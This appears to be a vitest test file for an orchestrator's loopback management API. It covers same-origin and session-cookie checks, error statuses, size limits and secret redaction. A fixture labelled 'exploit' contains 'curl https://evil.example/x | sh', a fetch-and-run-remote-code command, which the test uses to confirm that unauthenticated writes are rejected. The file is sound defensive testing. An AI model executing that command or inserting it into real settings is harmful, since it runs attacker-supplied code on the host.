import { expect, it } from 'vitest'
import { z } from 'zod'
import { registerHttp, sameOrigin } from '../src/app/http.ts'
import { PromptConflict } from '../src/app/prompts.ts'
import { SettingsConflict } from '../src/app/settings.ts'
import type { HttpHost } from '../src/app/http.ts'
import { SettingsSchema } from '../src/policy.ts'
import { SetupError } from '../src/setup.ts'
import { UserError } from '../src/core/index.ts'

type Handler = (req: unknown, res: unknown) => Promise<void>
type Headers = Record<string, string | undefined>
const COOKIE = 'dsh-auth-127.0.0.1:3082=panel-session'
/** The signed browser-session cookie the panel carries; any other value is an unauthenticated local caller. */
const SESSION = { requestRejection: (req: { headers: Headers }) => req.headers.cookie === COOKIE ? undefined : 401 as const }
/**
 * Mount management HTTP routes on a fake web server and return a request helper that includes the headers the panel
 * sends: loopback `Host`, same `Origin`, the custom request header, and the browser-session cookie.
 */
function serve(runtime: Partial<Record<keyof HttpHost, unknown>>, host = '127.0.0.1',
  options: { session?: typeof SESSION; connection?: boolean } = {}) {
  let handler: Handler = async () => {}
  const { session = SESSION, connection = true } = options
  const ctx = { webServer: { host, port: 3082, protocol: 'http:', register: (route: { handler: Handler }) => { handler = route.handler; return () => {} } },
    ...connection ? { get: (name: string) => name === 'connection' ? session : undefined } : {} }
  registerHttp(ctx as never, { ready: Promise.resolve(), ...runtime } as unknown as HttpHost)
  return async (method: string, path: string, body?: unknown, headers: Headers = {}) => {
    let status = 0, text = ''
    const chunks = body === undefined ? [] : [Buffer.from(typeof body === 'string' ? body : JSON.stringify(body))]
    const sent = Object.fromEntries(Object.entries({ host: '127.0.0.1:3082', origin: 'http://127.0.0.1:3082',
      'x-orchestrator-request': '1', cookie: COOKIE, ...headers }).filter(([, value]) => value !== undefined))
    const req = { method, url: `/orchestrator/api/${path}`, headers: sent, async *[Symbol.asyncIterator]() { yield* chunks } }
    await handler(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
}
/** Route table stubs that answer `GET models`, so a read never needs the runtime's real services. */
const models = { groups: [], default: null }

it('answers each kind of failure with its own status', async () => {
  const saves: unknown[] = []
  const call = serve({
    store: { tickets: { get: () => undefined }, blockRevision: () => 0 },
    sources: { instances: () => [{ id: 'github' }] },
    settings: { save: async (...args: unknown[]) => {
      saves.push(args)
      if (args[1] === 'stale') throw new SettingsConflict('Settings changed. Reload before saving.')
      if (args[1] === 'invalid') z.object({ maxWorkers: z.number() }).parse({})
      if (args[1] === 'refused') throw new SetupError('agentCliUnset')
      if (args[1] === 'broken') throw new Error('disk full')
      return { saved: true, revision: 1, restarting: false }
    } },
  })
  expect(await call('PUT', 'settings/executor', { value: 'stale', revision: 0 })).toMatchObject({ status: 409 })
  expect(await call('PUT', 'settings/executor', { value: 'invalid', revision: 0 })).toMatchObject({ status: 400, body: { issues: [{ path: 'maxWorkers' }] } })
  expect(await call('PUT', 'settings/source:github', { value: 'refused', revision: 0 })).toMatchObject({ status: 400, body: { setup: { code: 'agentCliUnset', place: 'github' } } })
  expect(await call('PUT', 'settings/executor', { value: 'broken', revision: 0 })).toEqual({ status: 500, body: { error: 'disk full' } })
  // Block names are validated before calling settings.save: reject unknown blocks or non-existent Sources.
  expect(await call('PUT', 'settings/pause', { value: {}, revision: 0 })).toMatchObject({ status: 400 })
  expect(await call('PUT', 'settings/source:feishu', { value: {}, revision: 0 })).toEqual({ status: 404, body: { error: 'Source not found' } })
  expect(saves).toHaveLength(4)
  expect(await call('POST', 'tickets/t9/retry')).toEqual({ status: 404, body: { error: 'Ticket not found' } })
  expect(await call('GET', 'nothing/here')).toEqual({ status: 404, body: { error: 'Unknown operation' } })
  expect(await call('POST', 'executor/pause', 'not json')).toEqual({ status: 400, body: { error: 'The request body is not JSON' } })
})

it('decodes path parameters and parses each route\'s query', async () => {
  const seen: unknown[] = []
  const call = serve({
    store: { settings: () => SettingsSchema.parse({}),
      read: { decisions: (filter: unknown, offset: number, limit: number) => { seen.push({ filter, offset, limit }); return { items: [], more: false } } } },
    links: () => () => ({ url: '', label: { zh: '', en: '' } }),
    engine: { unsubscribe: (key: string) => { seen.push(key); return true } },
    sessions: { delivery: async () => 'injected' },
  })
  expect(await call('POST', `threads/${encodeURIComponent('feishu:oc_1:om/root')}/unsubscribe`)).toMatchObject({ status: 200, body: { context_delivery: 'injected' } })
  // Invalid offsets default to 0, and limits above the route maximum are clamped.
  expect(await call('GET', 'decisions?kind=accept%2Creopen&limit=500&offset=x&window=24h')).toEqual({ status: 200, body: { items: [], next_offset: null } })
  expect(seen).toEqual(['feishu:oc_1:om/root', { filter: { kinds: ['accept', 'reopen'], since: expect.any(String) }, offset: 0, limit: 200 }])
})

it('answers only a same-origin request from the panel on the loopback address', async () => {
  const call = serve({ models: async () => models, sessions: { delivery: async () => 'injected' }, engine: { unsubscribe: () => true } })
  const post = (headers: Headers) => call('POST', 'threads/github%3A1/unsubscribe', undefined, headers)
  for (const headers of [{ 'x-orchestrator-request': undefined }, { host: 'evil.example:3082' }, { host: '127.0.0.1:9999' },
    { origin: 'http://evil.example' }, { origin: undefined }, { origin: 'null' }, { host: 'localhost:3082', origin: 'http://127.0.0.1:3082' }]) {
    expect(await post(headers), JSON.stringify(headers)).toEqual({ status: 403,
      body: { error: 'Same-origin management request required' } })
  }
  expect(await post({ host: 'localhost:3082', origin: 'http://localhost:3082' })).toMatchObject({ status: 200 })
  // A read may omit `Origin`, which browsers do on same-origin GET/HEAD; it still needs Host and the custom header.
  expect(await call('GET', 'models', undefined, { origin: undefined })).toEqual({ status: 200, body: models })
  // Management routes require a loopback Web server.
  expect(() => serve({}, '0.0.0.0')).toThrow('Orchestrator management requires a loopback Web server')
})

it('requires the signed DSH browser session for every state change, which a local process cannot forge', async () => {
  const saves: unknown[] = []
  const call = serve({
    store: { tickets: { get: () => undefined }, blockRevision: () => 0 },
    sources: { instances: () => [{ id: 'github' }] },
    settings: { save: async (...args: unknown[]) => { saves.push(args); return { saved: true, revision: 1, restarting: false } } },
    models: async () => models,
  })
  // A local process can set Host, Origin and the custom header itself, but not the cookie signed by the DSH host.
  const exploit = { value: { prepare: 'curl https://evil.example/x | sh' }, revision: 0 }
  expect(await call('PUT', 'settings/executor', exploit, { cookie: undefined }))
    .toMatchObject({ status: 401, body: { error: expect.stringContaining('browser session') } })
  expect(await call('PUT', 'settings/executor', exploit, { cookie: 'dsh-auth-127.0.0.1:3082=forged' })).toMatchObject({ status: 401 })
  expect(await call('PUT', 'settings/source:github', { value: { enabled: true, config: { cli: '/tmp/evil' } }, revision: 0 }, { cookie: undefined }))
    .toMatchObject({ status: 401 })
  expect(await call('PUT', 'prompts', { config: {}, baseRevision: 0 }, { cookie: undefined })).toMatchObject({ status: 401 })
  // Nothing reached the settings layer without the session.
  expect(saves).toEqual([])
  // Reads stay available to local status tools, which have no browser session.
  expect(await call('GET', 'models', undefined, { cookie: undefined })).toEqual({ status: 200, body: models })
  // The panel's own request, carrying its session, may change the execution environment.
  expect(await call('PUT', 'settings/executor', exploit)).toEqual({ status: 200, body: { saved: true, revision: 1, restarting: false } })
  expect(saves).toHaveLength(1)
})

it('fails closed for changes when the host provides no browser-session authority', async () => {
  const saves: unknown[] = []
  const call = serve({ settings: { save: async (...args: unknown[]) => { saves.push(args); return {} } } }, '127.0.0.1', { connection: false })
  expect(await call('PUT', 'settings/executor', { value: { prepare: '' }, revision: 0 }))
    .toEqual({ status: 503, body: { error: 'Management changes need the DSH Web Connection service, which this host does not provide' } })
  expect(saves).toEqual([])
})

it('redacts CLI diagnostics and request data from setup problems and 500 responses', async () => {
  const call = serve({
    store: { tickets: { get: () => undefined }, blockRevision: () => 0 },
    sources: { instances: () => [{ id: 'github' }] },
    settings: { save: async () => {
      throw new Error('lark-cli failed for https://api.feishu.cn/ok?token=abc123 while reading /home/me/.config/lark/config')
    } },
  })
  const failure = await call('PUT', 'settings/executor', { value: {}, revision: 0 })
  expect(failure.status).toBe(500)
  const error = String(failure.body.error)
  expect(error).toContain('lark-cli failed')
  expect(error).toContain('https://api.feishu.cn/ok?token=[redacted]')
  expect(error).not.toContain('abc123')
  expect(error).not.toContain('/home/me')
  expect(error).toContain('<path>')
  const refused = serve({ settings: { save: async () => { throw new SetupError('feishuCliFailed', {
    output: 'lark-cli: token=abc123 at /home/me/.config/lark/config' }) } } })
  const problem = await refused('PUT', 'settings/executor', { value: {}, revision: 0 })
  expect(problem.status).toBe(400)
  expect(problem.body).toMatchObject({ setup: { code: 'feishuCliFailed', values: {
    output: 'lark-cli: token=[redacted] at <path>' } } })
  expect(String(problem.body.error)).not.toContain('abc123')
  // A structured refusal keeps its code and values, and redacts a value that quotes a failing request.
  const model = serve({ settings: { save: async () => { throw new UserError('modelUnavailable', {
    block: 'eval', error: 'GET https://llm.example/models?api_key=sk-secret1234567890 failed' }) } } })
  expect(await model('PUT', 'settings/eval', { value: {}, revision: 0 })).toMatchObject({ status: 400,
    body: { code: 'modelUnavailable', values: { block: 'eval' } } })
  const values = (await model('PUT', 'settings/eval', { value: {}, revision: 0 })).body.values as Record<string, string>
  expect(values.error).not.toContain('sk-secret1234567890')
})

it('protects the Project control routes with the same-origin rule and calls their Engine commands', async () => {
  const calls: unknown[] = []
  const call = serve({ engine: {
    pauseProjectReport: (id: string, paused: boolean, mode?: string) => { calls.push(['pause', id, paused, mode ?? 'soft'])
      return { project: { status: paused ? 'paused' : 'active', ...(paused ? { pauseMode: mode ?? 'soft' } : {}) },
        workers: { stopped: [], failures: [] } } },
    pauseProject: (id: string, paused: boolean, mode?: string) => { calls.push(['pause', id, paused, mode ?? 'soft'])
      return { status: paused ? 'paused' : 'active', ...(paused ? { pauseMode: mode ?? 'soft' } : {}) } },
    allowResume: (id: string) => { calls.push(['allowResume', id]); return { id } },
    stopProject: (id: string) => { calls.push(['stop', id]); return { status: 'ended' } },
    archiveProject: (id: string) => { calls.push(['archive', id]); return { id, status: 'archived' } },
    unarchiveProject: (id: string) => { calls.push(['unarchive', id]); return { id, status: 'active' } },
  }, store: { projects: { get: (id: string) => id === 'p1' ? { id: 'p1', status: 'active', pmSessionId: 'pm-p1' } : undefined },
    tickets: { get: (id: string) => id === 't1' ? { id: 't1' } : undefined } },
  sessions: {
    pauseProject: async (_project: unknown, mode: string) => { calls.push(['pauseSessions', mode])
      return { delivered: true, cancelled: [], notLoaded: [], failures: [] } },
    resumeProject: async () => { calls.push(['resumeSessions']); return { delivered: false, cancelled: [], notLoaded: [], failures: [] } },
    archiveProject: async () => { calls.push(['archiveSessions']); return { ids: ['pm-p1'], failures: [] } },
    unarchiveProject: async () => { calls.push(['unarchiveSessions']); return { ids: ['pm-p1'], failures: [] } },
    openProject: async (project: { id: string; pmSessionId: string }) => { calls.push(['openProject', project.id]); return project.pmSessionId },
  }, requestPass: () => {} })
  const body = { paused: true, mode: 'soft' }
  const hard = { paused: true, mode: 'hard' }
  for (const headers of [{ 'x-orchestrator-request': undefined }, { host: 'evil.example:3082' }, { origin: 'http://evil.example' },
    { origin: undefined }]) {
    expect(await call('POST', 'projects/p1/pause', body, headers), JSON.stringify(headers)).toEqual({ status: 403,
      body: { error: 'Same-origin management request required' } })
    expect(await call('POST', 'projects/p1/stop', undefined, headers), JSON.stringify(headers)).toEqual({ status: 403,
      body: { error: 'Same-origin management request required' } })
    expect(await call('POST', 'projects/p1/archive', undefined, headers), JSON.stringify(headers)).toEqual({ status: 403,
      body: { error: 'Same-origin management request required' } })
    expect(await call('POST', 'projects/p1/unarchive', undefined, headers), JSON.stringify(headers)).toEqual({ status: 403,
      body: { error: 'Same-origin management request required' } })
    expect(await call('POST', 'projects/p1/pm', undefined, headers), JSON.stringify(headers)).toEqual({ status: 403,
      body: { error: 'Same-origin management request required' } })
  }
  // Forged headers without the browser session are refused before any Engine command runs.
  for (const route of ['projects/p1/pause', 'projects/p1/stop', 'tickets/t1/allow-resume']) {
    expect(await call('POST', route, body, { cookie: undefined })).toMatchObject({ status: 401 })
  }
  const allowed = { host: 'localhost:3082', origin: 'http://localhost:3082' }
  expect(await call('POST', 'projects/p1/pause', body, allowed)).toEqual({ status: 200,
    body: { paused: true, mode: 'soft', sessions: { delivered: true, cancelled: [], notLoaded: [], failures: [] },
      workers: { stopped: [], failures: [] } } })
  expect(await call('POST', 'projects/p1/pause', hard, allowed)).toEqual({ status: 200,
    body: { paused: true, mode: 'hard', sessions: { delivered: true, cancelled: [], notLoaded: [], failures: [] },
      workers: { stopped: [], failures: [] } } })
  expect(await call('POST', 'projects/p1/pause', { paused: false }, allowed)).toEqual({ status: 200,
    body: { paused: false, mode: null, sessions: { delivered: false, cancelled: [], notLoaded: [], failures: [] },
      workers: { stopped: [], failures: [] } } })
  expect(await call('POST', 'tickets/t1/allow-resume', undefined, allowed)).toEqual({ status: 200, body: { allowed: true } })
  expect(await call('POST', 'projects/p1/stop', undefined, allowed)).toEqual({ status: 200, body: { stopped: true } })
  expect(await call('POST', 'projects/p1/archive', undefined, allowed)).toEqual({ status: 200,
    body: { archived: true, sessions: { ids: ['pm-p1'], failures: [] } } })
  expect(await call('POST', 'projects/p1/unarchive', undefined, allowed)).toEqual({ status: 200,
    body: { archived: false, sessions: { ids: ['pm-p1'], failures: [] } } })
  expect(await call('POST', 'projects/p1/pm', undefined, allowed)).toEqual({ status: 200,
    body: { started: true, sessionId: 'pm-p1' } })
  expect(await call('POST', 'projects/missing/pm', undefined, allowed)).toEqual({ status: 404, body: { error: 'Project not found' } })
  expect(calls).toEqual([['pause', 'p1', true, 'soft'], ['pauseSessions', 'soft'], ['pause', 'p1', true, 'hard'],
    ['pauseSessions', 'hard'], ['pause', 'p1', false, 'soft'], ['resumeSessions'], ['allowResume', 't1'], ['stop', 'p1'],
    ['archive', 'p1'], ['archiveSessions'], ['unarchive', 'p1'], ['unarchiveSessions'], ['openProject', 'p1']])
})

it('answers a prompt save that lost a race with 409, and a settings body over 128 KiB with 400', async () => {
  const saves: unknown[] = []
  const call = serve({
    machine: { promptMaxChars: { get: () => 100_000 } },
    store: { atomic: (work: () => unknown) => work(), blockRevision: () => 0 },
    prompts: { save: () => { throw new PromptConflict('Prompt version changed to 3; compare the latest version before saving') } },
    sessions: { notify: () => {}, delivery: async () => 'injected' },
    settings: { save: async (...args: unknown[]) => { saves.push(args); return { saved: true, revision: 1, restarting: false } } },
  })
  expect(await call('PUT', 'prompts', { config: {}, baseRevision: 2 }))
    .toEqual({ status: 409, body: { error: 'Prompt version changed to 3; compare the latest version before saving' } })
  const value = { prepare: 'x'.repeat(128 * 1024) }
  expect(await call('PUT', 'settings/executor', { value, revision: 0 })).toEqual({ status: 400,
    body: { error: `Request exceeds ${128 * 1024} bytes` } })
  expect(saves).toEqual([])
})

it('checks the same-origin headers directly, requiring an Origin on state changes', () => {
  const read = (headers: Headers) => sameOrigin({ headers }, 3082)
  const write = (headers: Headers) => sameOrigin({ headers }, 3082, 'http:', true)
  const base = { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }
  expect(read(base)).toBe(true)
  expect(write(base)).toBe(false)
  expect(write({ ...base, origin: 'http://127.0.0.1:3082' })).toBe(true)
  expect(write({ ...base, origin: 'http://localhost:3082' })).toBe(false)
  expect(read({ ...base, origin: 'http://evil.example' })).toBe(false)
  expect(read({ ...base, host: 'evil.example:3082' })).toBe(false)
  expect(read({ ...base, 'x-orchestrator-request': undefined })).toBe(false)
})
